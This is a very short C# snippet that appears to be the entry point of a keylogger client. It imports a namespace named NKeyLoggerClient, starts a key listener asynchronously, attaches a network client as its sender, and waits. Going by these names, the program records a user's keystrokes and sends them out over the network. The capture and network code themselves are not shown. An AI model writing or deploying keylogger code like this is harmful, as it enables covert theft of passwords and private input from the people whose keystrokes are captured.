using NKeyLoggerClient;

Task<bool> listenTask = KeyListener.Instance.listenAsync();
KeyListener.Instance.sender = new NetworkClient();
listenTask.Wait();

